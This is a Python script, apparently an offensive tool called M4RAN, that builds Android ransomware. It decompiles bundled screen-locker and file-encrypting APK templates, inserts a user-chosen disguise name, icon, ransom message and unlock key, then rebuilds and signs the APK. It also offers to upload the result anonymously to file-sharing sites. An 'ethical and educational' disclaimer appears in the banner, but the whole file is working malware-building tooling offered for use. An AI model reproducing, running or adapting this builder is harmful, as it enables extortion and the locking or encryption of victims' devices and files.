#! /usr/bin/env python3
import os, sys, time, base64, json, fileinput
from shutil import which 
from getpass import getpass
try:
    from PIL import Image
except (ImportError,ModuleNotFoundError):
    os.system("python3 -m pip install --upgrade pip && python3 -m pip install Pillow")
# colors
r,g,y,b,d,R,Y,B,w,W,D = "\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[2;37m","\033[1;41m","\033[1;43m","\033[1;44m","\033[0m","\033[1;47m","\033[2;00m"
# get default encoding
if not sys.getdefaultencoding() == "utf-8":
    exit(f"{w}{R} ERROR {w} por favor configure la codificacion de la terminal como UTF-8")
# check file and directory
if not os.path.isdir("data"): exit(f"{w}{R} ERROR {w} directorio de datos no encontrado !")
if not os.path.isfile("signer.jar"): exit(f"{w}{R} ERROR {w} archivo signer.jar no encontrado !")
if not os.path.isfile("testkey.jks"): exit(f"{w}{R} ERROR {w} archivo testkey.jks no encontrado !")
# check module and requirements
def check_requirements():
    if which("aapt"): pass
    else: exit(f"{w}{R} ERROR {w} por favor instala el paquete: aapt")
    if which("mogrify"): pass
    else: exit(f"{w}{R} ERROR {w} por favor instala el paquete: imagemagick")
    if which("java"):
        java_version=os.popen("java --version","r").read().splitlines()[0]
        if not "openjdk 17" in java_version: exit(f"{w}{R} ERROR {w} oops su java no es openjdk 17 !")
    else: exit(f"{w}{R} ERROR {w} por favor instala el paquete: openjdk 17")
    if which("apktool"):
        apktool_version=os.popen("apktool --version","r").read().splitlines()[0]
        if not "2.6.1" in apktool_version: exit(f"{w}{R} ERROR {w} oops su apktool no es la version 2.6.1 !")
    else: exit(f"{w}{R} ERROR {w} por favor instala el paquete: apktool 2.6.1")
# clear screen
def clear():
    os.system("cls" if os.name == "nt" else "clear")
# variables
imgv1 = ["m4ransom/res/drawable-hdpi-v4/ic_launcher.png","m4ransom/res/drawable-mdpi-v4/ic_launcher.png","m4ransom/res/drawable-xhdpi-v4/ic_launcher.png","m4ransom/res/drawable-xxhdpi-v4/ic_launcher.png"]
imgv2 = ["m4ransom/res/mipmap-hdpi/ic_launcher.png","m4ransom/res/mipmap-mdpi/ic_launcher.png","m4ransom/res/mipmap-xhdpi/ic_launcher.png","m4ransom/res/mipmap-xxhdpi/ic_launcher.png","m4ransom/res/mipmap-xxxhdpi/ic_launcher.png"]
# banner
# M4RAN - RANSOMWARE SIMPLE PARA ANDROID (version 2.0)
class m4ransom:
    def __init__(self):
        self.AppIcon=""
        self.AppName=""
        self.AppTitle=""
        self.AppDesc=""
        self.AppKeys=""
    def write(self,file,old,new):
        while True:
            if os.path.isfile(file):
                replaces = {old:new}
                for line in fileinput.input(file, inplace=True):
                    for search in replaces:
                        replaced = replaces[search]
                        line = line.replace(search,replaced)
                    print(line, end="")
                break
            else: os.system("rm -rf m4ransom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} fallo al escribirse el archivo: {file}")
    def buildapk(self):
        try:
            os.system("apktool b --use-aapt2 m4ransom -o final.apk")
            if os.path.isfile("final.apk"):
                os.system("rm -rf m4ransom > /dev/null 2>&1")
                os.system("java -jar signer.jar -a final.apk --ks testkey.jks --ksAlias android --ksPass android --ksKeyPass android > /dev/null 2>&1")
                os.system("java -jar signer.jar -a final.apk --onlyVerify > /dev/null 2>&1")
                if os.path.isfile("final-aligned-signed.apk"):
                    output = self.AppName.replace(' ','')+".apk"
                    os.system("rm -rf final.apk > /dev/null 2>&1")
                    os.system("mv final-aligned-signed.apk "+output)
                    print(w+"-"*43)
                    ask=str(input(f"{b}>{w} QUieres compartir la aplicasion mediante un enlace (en desarrollo) ? (y/n): ").lower())
                    if ask == "y":
                        print(f"""
{w}[{r}SHARE TO{w}]

{w}[{b}1{w}] transfer.sh - transfer file online
{w}[{b}2{w}] anonfiles.com - anonymous file upload
                        """)
                        while True:
                            x=str(input(f"{b}>{w} choose: "))
                            if x in ("1","01"):
                                link=os.popen(f"curl -s --upload-file {output} https://transfer.sh").readline().strip()
                                if len(str(link)) != 0: print(f"{b}>{w} Success shared to: {g}{link}{w}"); break
                                else: print(f"{b}>{w} Failed shared to: {r}https://transfer sh{w}"); break
                            elif x in ("2","02"):
                                os.system(f"curl --no-progress-meter -F 'file=@{output}' https://api.anonfile.com/upload > response.json")
                                f=open("response.json","r")
                                j=json.load(f)
                                if j["status"] == True:
                                    f.close()
                                    os.system("rm -rf response.json")
                                    link=j["data"]["file"]["url"]["full"]
                                    print(f"{b}>{w} Success shared to: {g}{link}{w}")
                                    break
                                else: print(f"{b}>{w} Failed shared to: {r}https://anonfile.com{w}"); break
                            else: continue
                    else: pass
                    getpass(f"{b}>{w} Archivo guardado en: {B} {output} {w}")
                    exit()
                else: os.system("rm -rf final.apk > /dev/null 2>&1"); exit(f"{w}{R} ERROR {w} Fallo la firma de APK's")
            else: os.system("rm -rf m4ransom > /dev/null 2>&1"); exit(f"{w}{R} ERROR {w} Fallo la creacion de APK's")
        except Exception as ERROR:
            exit(f"{w}{R} ERROR {w} Procesp detenido: {ERROR}")
    def builder(self,version):
        print("")
        if version == 1:
            while True:
                x=str(input(f"{b}>{w} Ingresa la ruta de ubicacion del icono({r}PNG: example: /home/user/Descargas/icon.png{w}): "+g))
                if os.path.isfile(x):
                    if ".png" in x:
                        self.AppIcon=x
                        break
                    else: print(f"{w}{R} ERROR {w} El formato del archivo no es aceptado !"); continue
                else: print(f"{w}{R} ERROR {w} Archivo no encontrado por favor rellene correctamente !"); continue
            while True:
                x=str(input(f"{b}>{w} Ingresa el nombre para la app: ({r}EX: My Apps{w}): "+g))
                if len(x) !=0: self.AppName=x; break
                else: continue
            while True:
                x=str(input(f"{b}>{w} Ingresa el titulo que aparecera: ({r}EX: Telefono bloqueado{w}): "+g))
                if len(x) !=0: self.AppTitle=x; break
                else: continue
            while True:
                x=str(input(f"{b}>{w} Ingresa la descripcion que aparecera: ({r}EX: Contactame{w}): "+g))
                if len(x) !=0: self.AppDesc=x; break
                else: continue
            while True:
                x=str(input(f"{b}>{w} Ingresa la contraseña para desbloquear la app: ({r}EX: Contraseña {w}): "+g))
                if len(x) !=0: self.AppKeys=x; break
                else: continue
            print(f"{b}>{w} Creando tu ransomware APK's")
            print(w+"-"*43+d)
            os.system("apktool d data/v1/m4ransom.apk")
            if os.path.isdir("m4ransom"):
                strings="m4ransom/res/values/strings.xml"
                print("I: Using strings: "+strings)
                smali=os.popen(f"find -L m4ransom/ -name '*0000.smali'","r").readline().strip()
                print("I: Using smali "+os.path.basename(smali))
                self.write(strings,"appname",self.AppName)
                print("I: Adding name with "+self.AppName)
                self.write(strings,"alert_title",self.AppTitle)
                print("I: Adding title with "+self.AppTitle)
                self.write(strings,"alert_desc",self.AppDesc)
                print("I: Adding description with "+str(len(self.AppDesc))+" words")
                self.write(smali,"key_pass",self.AppKeys)
                print("I: Adding unlock key with "+self.AppKeys)
                time.sleep(3)
                print("I: Adding icon with "+self.AppIcon)
                for path in imgv1:
                    if os.path.isfile(path):
                        with Image.open(path) as target:
                            width, height = target.size
                            size = str(width)+"x"+str(height)
                            logo = "m4ransom"+os.path.basename(self.AppIcon)
                            os.system("cp -R "+self.AppIcon+" "+logo)
                            os.system("mogrify -resize "+size+" "+logo+";cp -R "+logo+" "+path)
                            os.system("rm -rf "+logo)
                    else: os.system("rm -rf m4ransom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} directorio no disponible: {path}")
                self.buildapk()
            else: os.system("rm -rf m4ransom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} fallo la descompilacion de la APK")
        elif version == 2:
            while True:
                x=str(input(f"{b}>{w} Ingresa la ruta del icono para la app: ({r}PNG: example: home/user/Descargas/icon.png{w}): "+g))
                if os.path.isfile(x):
                    if ".png" in x:
                        self.AppIcon=x
                        break
                    else: print(f"{w}{R} ERROR {w} Formato del archivo no aceptado!"); continue
                else: print(f"{w}{R} ERROR {w} Ubicacion del archivo incorrecta, por favor ingrese la ruta nuevamente: !"); continue
            while True:
                x=str(input(f"{b}>{w} Ingrese el nombre para la app: ({r}EX: Mi Apps{w}): "+g))
                if len(x) !=0: self.AppName=x; break
                else: continue
            while True:
                x=str(input(f"{b}>{w} Ingrese la descripcion de la alerta: ({r}EX: Contacta a mr x {w}): "+g))
                if len(x) !=0: self.AppDesc=x; break
                else: continue
            print(f"{b}>{w} Creando tu ransomware APK's")
            print(w+"-"*43+d)
            os.system("apktool d data/v2/m4ransom.apk")
            if os.path.isdir("m4ransom"):
                strings="m4ransom/res/values/strings.xml"
                print("I: Using strings: "+strings)
                self.write(strings,"AppName",self.AppName)
                self.write("m4ransom/smali/com/termuxhackersid/services/EncryptionService.smali","AppName",self.AppName)
                self.write("m4ransom/smali/com/termuxhackersid/services/DecryptionService.smali","AppName",self.AppName)
                print("I: Adding name with "+self.AppName)
                self.write("m4ransom/smali/com/termuxhackersid/services/EncryptionService.smali","AppDesc",self.AppDesc)
                self.write("m4ransom/smali/com/termuxhackersid/ui/MainActivity$a.smali","AppDesc",self.AppDesc)
                self.write("m4ransom/smali/com/termuxhackersid/ui/MainActivity.smali","AppDesc",self.AppDesc)
                print("I: Adding description with "+str(len(self.AppDesc))+" words")
                time.sleep(3)
                print("I: Adding icon with "+self.AppIcon)
                for path in imgv2:
                    if os.path.isfile(path):
                        with Image.open(path) as target:
                            width, height = target.size
                            size = str(width)+"x"+str(height)
                            logo = "m4ransom-"+os.path.basename(self.AppIcon)
                            os.system("cp -R "+self.AppIcon+" "+logo)
                            os.system("mogrify -resize "+size+" "+logo+";cp -R "+logo+" "+path)
                            os.system("rm -rf "+logo)
                    else: os.system("rm -rf m4ransom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} directorio no disponible: {path}")
                self.buildapk()
            else: os.system("rm -rf m4ransom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} fallo al descompilar APK's")
        else: exit(f"{w}{R} ERROR {w} oops aún no hay otra versión !")
    def menu(self):
        clear()
        print(f"""
        
{w}{R} M4RAN {w} CREADOR SIMPLE DE RANSOMWARE SIMPLE PARA ANDROID


BY M4LVOK SECURTITY

Herramienta simple para crecion de Ransomware
                                      
⠀⠀⠀⠀⣿⠉⣉⣉⣉⣉⣉⣉⣉⣁⣈⣁⣈⣉⣉⣉⣉⣉⣉⣉⠉⣿⠀⠀⠀ 
⠀⠀⠀⠀⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⠀               Quien con demonios juega,⠀
⠀⠀⠀⠀⣿⣀⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣀⣿⠀⠀⠀        debe cuidar no volverse uno.
⠀⠀⠀⠀⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠀⠀⠀⠀
⠀⠀⠀⠀⣶⡖⠀⠶⠖⠀⠶⠆⠐⠶⠆⠰⠶⠂⠰⠶⠀⠲⠶⠀⢲⣶⠀⠀              ⠀⠀ BY M4LVOK SECURITY 
⠀⠀⠀⢰⣿⠃⠐⠒⠂⠐⠒⠀⠒⠒⠂⠐⠒⠒⠀⠒⠂⠐⠒⠂⠘⣿⡆⠀                   ⠀⠀Version: 1.0 Spanish 
⠀⠀⠀⣾⡿⠀⠛⠛⠀⠚⠛⠀⠚⠛⠃⠘⠛⠓⠀⠛⠓⠀⠛⠛⠀⢿⣷⠀⠀⠀                Fecha:04/09/2023 
⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⡏⢸⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀                 
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⠀⠙⠛⠛⠛⠛⠛⠛⠋⠀⣿⣿⣿⣿⣿⣿⣿⣷⠀   
⠀⠀⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⠀⠀


Herramienta proporcionada con fines eticos y educativos, 
el creador no se responsabiliza por el uso que se le de
a dicha herramienta.

{w}[{r}Elige un tipo de Ransomware{w}]

{w}[{b}1{w}] M4RANSOM - Tipo bloqueador de pantalla {w}({y} ANDROID 10 {w})
{w}[{b}2{w}] M4RANSOM - Tipo encriptador de archivos {w}({y} ANDROID 7.1 {w})
{w}[{b}3{w}] M4RANSOM -Salir de la consola
        """)
        while True:
            x=str(input(f"{w}[{b}?{w}] Opcion: "))
            if x in ("1","01"): self.builder(1); break
            elif x in ("2","02"): self.builder(2); break
            elif x in ("3","03"): exit(f"{w}{R} Saliendo {w} Gracias por usar la herramienta !")
            else: continue
        
if __name__ == "__main__":
    try:
        m4ransom=m4ransom()
        m4ransom.menu()
    except KeyboardInterrupt:
        exit(f"{w}{R} Saliendo {w} El usuario termino el proceso")
